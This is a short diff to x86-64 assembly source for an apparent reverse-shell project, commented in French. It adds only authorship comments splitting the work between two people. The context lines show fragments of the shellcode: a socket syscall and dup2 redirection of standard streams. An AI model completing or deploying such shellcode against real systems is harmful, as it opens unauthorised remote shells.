@@ -9,6 +9,8 @@ global _start
 ; Commencement du Reverse en ASM
 ; Création du socket
 
+; PARTIE JULIEN DEBUT ;
+
 _start:
     ; socket syscall
     mov al, 41  ; sys_socket
@@ -39,6 +41,11 @@ _start:
     ; dup2 syscall for stdin, stdout, stderr
     xor rsi, rsi
     mov sil, 2
+
+ ; PARTIE JULIEN FIN ;
+
+ ; PARTIE ALEXY DEBUT ;
+
 
 .loop:
     xor rax, rax
